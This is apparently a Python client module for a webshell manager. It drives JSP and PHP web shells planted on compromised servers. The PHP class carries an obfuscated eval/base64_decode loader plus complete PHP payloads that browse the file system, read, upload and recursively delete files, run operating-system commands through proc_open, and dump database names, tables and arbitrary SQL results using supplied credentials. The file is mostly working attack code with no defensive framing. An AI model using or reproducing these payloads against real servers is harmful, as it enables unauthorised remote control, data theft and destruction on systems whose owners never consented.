# coding=utf-8

"""
@version: 1.0
@author: chaowei
@file: shell.py
@time: 2018/2/18 16:52
"""
import requests,base64

import sys

sys.path.append("..")

import config
from entity import *
from dbHelper import DatabaseHelper
from logger import log

class ShellTools:

    def __init__(self):
        pass

    @staticmethod
    def getShellTools(shellEntity):
        if shellEntity.shell_script_type=='JSP':
            return JspShell(shellEntity)
        if shellEntity.shell_script_type=='PHP':
            return PHPShell(shellEntity)

class JspShell:

    def __init__(self,shellEntity):
        self.shellEntity=shellEntity
        self.httpSettingEntity=DatabaseHelper.getHttpSettingEntityByShellID(shellEntity.shell_id)
        if not self.httpSettingEntity:
            self.httpSettingEntity=HttpSettingEntity(config.HTTP_DEFAULT_COOKIE,config.HTTP_DEFAULT_UA)
        self.httpHeaders={'User-Agent': self.httpSettingEntity.user_agent,'Cookie':self.httpSettingEntity.cookie}

    def __sendRequests(self,payload):
        response=None
        try:
            response= requests.post(self.shellEntity.shell_address, headers=self.httpHeaders, data=payload, verify=False)
        except Exception as e:
            log.e(str(e))
        return response

    def getStart(self):
        payload = {self.shellEntity.shell_password: 'A', 'z0': self.shellEntity.shell_encode_type}
        return self.__sendRequests(payload)

    def getDirectoryContent(self, path):
        payload = {self.shellEntity.shell_password: 'B', 'z1': path, 'z0': self.shellEntity.shell_encode_type}
        return self.__sendRequests(payload)

    def getFileContent(self,path):
        payload = {self.shellEntity.shell_password: 'C', 'z1': path, 'z0': self.shellEntity.shell_encode_type}
        return self.__sendRequests(payload)

    def createFile(self,path,content):
        payload = {self.shellEntity.shell_password: 'D', 'z1': path, 'z0': self.shellEntity.shell_encode_type,
                   'z2': content}
        return self.__sendRequests(payload)

    def deleteFileOrDirectory(self,path):
        payload = {self.shellEntity.shell_password: 'E', 'z1': path, 'z0': self.shellEntity.shell_encode_type}
        return self.__sendRequests(payload)

    def downloadFile(self,path):
        chunk_size = 1024
        payload = {self.shellEntity.shell_password: 'F', 'z1': path, 'z0': self.shellEntity.shell_encode_type}
        response = requests.post(self.shellEntity.shell_address, headers=self.httpHeaders, data=payload,stream=True,verify=False)
        if response.status_code==200:
            for data in response.iter_content(chunk_size=chunk_size):
                yield True,data
        else:
            yield False,response

    def uploadFile(self,path,hexString):
        payload = {self.shellEntity.shell_password: 'G', 'z1': path, 'z0': self.shellEntity.shell_encode_type,
                   'z2': hexString}
        return self.__sendRequests(payload)

    def excuteCommand(self,commandZ1,commandZ2):
        payload = {self.shellEntity.shell_password: 'M', 'z1': commandZ1, 'z2': commandZ2,
                   'z0': self.shellEntity.shell_encode_type}
        return self.__sendRequests(payload)

    def getDatabases(self,connectInfo):
        payload = {self.shellEntity.shell_password: 'N', 'z1': connectInfo.replace('\n', '\r\n'),
                   'z0': self.shellEntity.shell_encode_type, 'z2': ''}
        return self.__sendRequests(payload)

    def getTables(self,connectInfo,databaseName):
        payload = {self.shellEntity.shell_password: 'O',
                   'z1': connectInfo.replace('\n', '\r\n') + '\r\n' + databaseName,
                   'z0': self.shellEntity.shell_encode_type, 'z2': ''}
        return self.__sendRequests(payload)

    def getColumns(self,connectInfo,databaseName,tableName):
        payload = {self.shellEntity.shell_password: 'P',
                   'z1': connectInfo.replace('\n', '\r\n') + '\r\n' + databaseName + '\r\n' + tableName,
                   'z0': self.shellEntity.shell_encode_type, 'z2': ''}
        return self.__sendRequests(payload)

    def excuteSqlQuery(self,connectInfo,databaseName,sqlStr):
        payload = {self.shellEntity.shell_password: 'Q',
                   'z1': connectInfo.replace('\n', '\r\n') + '\r\n' + databaseName, 'z2': sqlStr,
                   'z0': self.shellEntity.shell_encode_type}
        return self.__sendRequests(payload)

class PHPShell:

    def __init__(self,shellEntity):
        self.shellEntity=shellEntity
        self.httpSettingEntity=DatabaseHelper.getHttpSettingEntityByShellID(shellEntity.shell_id)
        if not self.httpSettingEntity:
            self.httpSettingEntity=HttpSettingEntity(config.HTTP_DEFAULT_COOKIE,config.HTTP_DEFAULT_UA)
        self.httpHeaders={'User-Agent': self.httpSettingEntity.user_agent,'Cookie':self.httpSettingEntity.cookie}

        self.evalstring='$xx=chr(98).chr(97).chr(115).chr(101).chr(54).chr(52).chr(95).chr(100).chr(101).chr(99).chr(111).chr(100).chr(101);$yy=$_POST;@eval/**/{0}($xx/**/{0}($yy[z0]));'.format(chr(1),chr(1))

    def __sendRequests(self,payload):
        response=None
        try:
            response= requests.post(self.shellEntity.shell_address, headers=self.httpHeaders, data=payload, verify=False)
        except Exception as e:
            log.e(str(e))
        return response

    def getStart(self):
        z0='''@ini_set("display_errors","0");@set_time_limit(0);ini_set("magic_quotes_runtime",0);echo("->|");;$D=dirname(__FILE__);$R="{$D}\t";if(substr($D,0,1)!="/"){foreach(range("A","Z") as $L)if(is_dir("{$L}:"))$R.="{$L}:";}$R.="\t";$u=(function_exists('posix_getegid'))?@posix_getpwuid(@posix_geteuid()):'';$usr=($u)?$u['name']:@get_current_user();$R.=php_uname();$R.="({$usr})";print $R;;echo("|<-");die();'''
        payload = {self.shellEntity.shell_password:self.evalstring , 'z0': base64.b64encode(z0)}
        return self.__sendRequests(payload)

    def getDirectoryContent(self, path):
        z0='''@ini_set("display_errors","0");@set_time_limit(0);ini_set("magic_quotes_runtime",0);echo("->|");;$D=base64_decode(get_magic_quotes_gpc()?stripslashes($_POST["z1"]):$_POST["z1"]);$F=@opendir($D);if($F==NULL){echo("ERROR:// Path Not Found Or No Permission!");}else{$M=NULL;$L=NULL;while($N=@readdir($F)){$P=$D."/".$N;$T=@date("Y-m-d H:i:s",@filemtime($P));@$E=substr(base_convert(@fileperms($P),10,8),-4);$R="\\t".$T."\\t".@filesize($P)."\\t".$E."
";if(@is_dir($P))$M.=$N."/".$R;else $L.=$N.$R;}echo $M.$L;@closedir($F);};echo("|<-");die();'''
        payload = {self.shellEntity.shell_password: self.evalstring, 'z1': base64.b64encode(path), 'z0': base64.b64encode(z0)}
        return self.__sendRequests(payload)

    def getFileContent(self,path):
        z0='''@ini_set("display_errors","0");@set_time_limit(0);ini_set("magic_quotes_runtime",0);echo("->|");;$F=base64_decode(get_magic_quotes_gpc()?stripslashes($_POST["z1"]):$_POST["z1"]);$P=@fopen($F,"r");echo(@fread($P,filesize($F)));@fclose($P);;echo("|<-");die();'''
        payload = {self.shellEntity.shell_password: self.evalstring, 'z1': base64.b64encode(path),
                   'z0': base64.b64encode(z0)}
        return self.__sendRequests(payload)

    def createFile(self,path,content):
        z0='''@ini_set("display_errors","0");@set_time_limit(0);ini_set("magic_quotes_runtime",0);echo("->|");;echo @fwrite(fopen(base64_decode($_POST["z1"]),"w"),base64_decode($_POST["z2"]))?"1":"0";;echo("|<-");die();'''
        payload = {self.shellEntity.shell_password: self.evalstring, 'z1': base64.b64encode(path),
                   'z0': base64.b64encode(z0),'z2': base64.b64encode(content)}
        return self.__sendRequests(payload)

    def deleteFileOrDirectory(self,path):
        z0='''@ini_set("display_errors","0");@set_time_limit(0);ini_set("magic_quotes_runtime",0);echo("->|");;function df($p){$m=@dir($p);while(@$f=$m->read()){$pf=$p."/".$f;if((is_dir($pf))&&($f!=".")&&($f!="..")){@chmod($pf,0777);df($pf);}if(is_file($pf)){@chmod($pf,0777);@unlink($pf);}}$m->close();@chmod($p,0777);return @rmdir($p);}$F=get_magic_quotes_gpc()?stripslashes($_POST["z1"]):$_POST["z1"];$F=base64_decode($F);if(is_dir($F))echo(df($F));else{echo(file_exists($F)?@unlink($F)?"1":"0":"0");};echo("|<-");die();'''
        payload = {self.shellEntity.shell_password: self.evalstring, 'z1': base64.b64encode(path),
                   'z0': base64.b64encode(z0)}
        return self.__sendRequests(payload)

    def downloadFile(self,path):
        z0='''@ini_set("display_errors","0");@set_time_limit(0);ini_set("magic_quotes_runtime",0);echo("->|");;$F=get_magic_quotes_gpc()?stripslashes($_POST["z1"]):$_POST["z1"];$fp=@fopen($F,"r");if(@fgetc($fp)){@fclose($fp);@readfile($F);}else{echo("ERROR:// Can Not Read");};echo("|<-");die();'''
        chunk_size = 1024
        payload = {self.shellEntity.shell_password: self.evalstring, 'z1': path, 'z0': base64.b64encode(z0)}
        response = requests.post(self.shellEntity.shell_address, headers=self.httpHeaders, data=payload,stream=True,verify=False)
        if response.status_code==200:
            for data in response.iter_content(chunk_size=chunk_size):
                yield True,data
        else:
            yield False,response

    def uploadFile(self,path,hexString):
        z0='''@ini_set("display_errors","0");@set_time_limit(0);ini_set("magic_quotes_runtime",0);echo("->|");;$f=base64_decode($_POST["z1"]);$c=$_POST["z2"];$c=str_replace("\\r","",$c);$c=str_replace("\\n","",$c);$buf="";for($i=0;$i<strlen($c);$i+=2)$buf.=urldecode("%".substr($c,$i,2));echo(@fwrite(fopen($f,"w"),$buf)?"1":"0");echo("|<-");die();'''
        payload = {self.shellEntity.shell_password: self.evalstring, 'z1': base64.b64encode(path),
                   'z0': base64.b64encode(z0), 'z2': hexString}
        return self.__sendRequests(payload)

    def excuteCommand(self,commandZ1,commandZ2):
        z0='''@ini_set("display_errors","0");@set_time_limit(0);ini_set("magic_quotes_runtime",0);echo("->|");;$m=get_magic_quotes_gpc();$p=base64_decode($m?stripslashes($_POST["z1"]):$_POST["z1"]);$s=base64_decode($m?stripslashes($_POST["z2"]):$_POST["z2"]);$d=dirname($_SERVER["SCRIPT_FILENAME"]);$c=substr($d,0,1)=="/"?"-c \\"{$s}\\"":"/c \\"{$s}\\"";$r="{$p} {$c}";$array=array(array("pipe","r"),array("pipe","w"),array("pipe","w"));$fp=proc_open($r." 2>&1",$array,$pipes);$ret=stream_get_contents($pipes[1]);proc_close($fp);print $ret;;echo("|<-");die();'''
        payload = {self.shellEntity.shell_password: self.evalstring, 'z1': base64.b64encode(commandZ1), 'z2': base64.b64encode(commandZ2),
                   'z0': base64.b64encode(z0)}
        return self.__sendRequests(payload)

    def getDatabases(self,dbConnectInfo):
        z0='''@ini_set("display_errors","0");@set_time_limit(0);ini_set("magic_quotes_runtime",0);echo("->|");;$m=get_magic_quotes_gpc();$hst=$m?stripslashes($_POST["z1"]):$_POST["z1"];$usr=$m?stripslashes($_POST["z2"]):$_POST["z2"];$pwd=$m?stripslashes($_POST["z3"]):$_POST["z3"];$dbn=$m?stripslashes($_POST["z4"]):$_POST["z4"];$T=@mysqli_connect($hst,$usr,$pwd);if(!$T){print "ERROR:// ".mysqli_error($T);}else{$q=@mysqli_query($T,"SHOW DATABASES");if(!$q){@mysqli_select_db("${dbn}");$q=@mysqli_query("select database()");}while($rs=@mysqli_fetch_row($q)){echo(trim($rs[0]).chr(9));}@mysqli_close($T);};echo("|<-");die();'''
        payload = {self.shellEntity.shell_password: self.evalstring, 'z1': dbConnectInfo.dbAddress,
                   'z0': base64.b64encode(z0), 'z2':dbConnectInfo.dbUsername,'z3':dbConnectInfo.dbPassword}
        return self.__sendRequests(payload)

    def getTables(self,dbConnectInfo,dbName):
        z0 = '''@ini_set("display_errors","0");@set_time_limit(0);ini_set("magic_quotes_runtime",0);echo("->|");;$m=get_magic_quotes_gpc();$hst=$m?stripslashes($_POST["z1"]):$_POST["z1"];$usr=$m?stripslashes($_POST["z2"]):$_POST["z2"];$pwd=$m?stripslashes($_POST["z3"]):$_POST["z3"];$dbn=$m?stripslashes($_POST["z4"]):$_POST["z4"];$T=@mysqli_connect($hst,$usr,$pwd);$q=@mysqli_query($T,"SHOW TABLES FROM `{$dbn}`");while($rs=@mysqli_fetch_row($q)){echo(trim($rs[0]).chr(9));}@mysqli_close($T);;echo("|<-");die();'''
        payload = {self.shellEntity.shell_password: self.evalstring, 'z1': dbConnectInfo.dbAddress,'z0': base64.b64encode(z0), 'z2': dbConnectInfo.dbUsername, 'z3': dbConnectInfo.dbPassword,'z4': dbName}
        return self.__sendRequests(payload)

    def getColumns(self,dbConnectInfo,dbName,tbName):
        z0 = '''@ini_set("display_errors","0");@set_time_limit(0);if (function_exists("set_magic_quotes_runtime")){@set_magic_quotes_runtime(0);}else{ini_set("magic_quotes_runtime",0);}echo("->|");;$m=get_magic_quotes_gpc();$hst=$m?stripslashes($_POST["z1"]):$_POST["z1"];$usr=$m?stripslashes($_POST["z2"]):$_POST["z2"];$pwd=$m?stripslashes($_POST["z3"]):$_POST["z3"];$dbn=$m?stripslashes($_POST["z4"]):$_POST["z4"];$tab=$m?stripslashes($_POST["z5"]):$_POST["z5"];$T=@mysqli_connect($hst,$usr,$pwd);@mysqli_select_db($T,$dbn);$q=@mysqli_query($T,"SHOW COLUMNS FROM `{$tab}`");while($rs=@mysqli_fetch_row($q)){echo(trim($rs[0])." (".$rs[1].")".chr(9));}@mysqli_close($T);;echo("|<-");die();'''
        payload = {self.shellEntity.shell_password: self.evalstring, 'z1': dbConnectInfo.dbAddress,
                   'z0': base64.b64encode(z0), 'z2': dbConnectInfo.dbUsername, 'z3': dbConnectInfo.dbPassword,
                   'z4': dbName,'z5':tbName}
        return self.__sendRequests(payload)

    def excuteSqlQuery(self,dbConnectInfo,dbName,sqlStr):
        z0 = '''@ini_set("display_errors","0");@set_time_limit(0);ini_set("magic_quotes_runtime",0);echo("->|");;$m=get_magic_quotes_gpc();$hst=$m?stripslashes($_POST["z1"]):$_POST["z1"];$usr=$m?stripslashes($_POST["z2"]):$_POST["z2"];$pwd=$m?stripslashes($_POST["z3"]):$_POST["z3"];$dbn=$m?stripslashes($_POST["z4"]):$_POST["z4"];$sql=base64_decode($_POST["z5"]);$T=@mysqli_connect($hst,$usr,$pwd);@mysqli_query($T,"SET NAMES utf8");@mysqli_select_db($T,$dbn);$q=@mysqli_query($T,$sql);$i=0;while($property =@mysqli_fetch_field($q)){echo($property->name."\\t|\\t");$i++;}echo("\\r\\n");while($rs=@mysqli_fetch_row($q)){for($c=0;$c<$i;$c++){echo(trim($rs[$c]));echo("\\t|\\t");}echo("\\r\\n");}@mysqli_close($T);;echo("|<-");die();'''
        payload = {self.shellEntity.shell_password: self.evalstring, 'z1': dbConnectInfo.dbAddress,
                   'z0': base64.b64encode(z0), 'z2': dbConnectInfo.dbUsername, 'z3': dbConnectInfo.dbPassword,
                   'z4': dbName,'z5':base64.b64encode(sqlStr)}
        return self.__sendRequests(payload)
